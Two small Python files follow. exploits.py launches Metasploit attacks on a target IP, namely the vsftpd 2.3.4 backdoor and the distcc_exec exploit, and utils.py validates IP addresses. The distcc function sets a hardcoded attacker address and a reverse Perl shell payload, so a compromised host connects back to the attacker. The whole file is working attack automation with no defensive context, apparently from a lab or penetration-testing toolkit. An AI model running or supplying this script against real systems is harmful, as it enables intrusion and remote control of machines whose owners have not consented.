## exploits.py
import subprocess

def exploit_vsftpd(target_ip):
    print(f"[+] Launching vsftpd exploit against {target_ip}...")
    cmd = f"msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOST {target_ip}; run; exit'"
    subprocess.call(cmd, shell=True)


def exploit_distcc(target_ip, port=4444):
    attacker_ip = "192.168.100.100"  # Hardcoded attacker IP
    
    print(f"[+] Launching distcc exploit against {target_ip}...")

    # Set the payload to reverse_perl or any other suitable payload
    payload = "cmd/unix/reverse_perl"  # You can also use other reverse shells like reverse_python

    # Prepare the msfconsole command
    cmd = f"msfconsole -q -x 'use exploit/unix/misc/distcc_exec; " \
          f"set RHOST {target_ip}; " \
          f"set LHOST {attacker_ip}; " \
          f"set LPORT {port}; " \
          f"set PAYLOAD {payload}; " \
          f"run; exit'"

    # Execute the exploit
    subprocess.call(cmd, shell=True)



### utils.py
# placeholder for shared functions (if needed)

def validate_ip(ip):
    import re
    pattern = r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$"
    return re.match(pattern, ip)
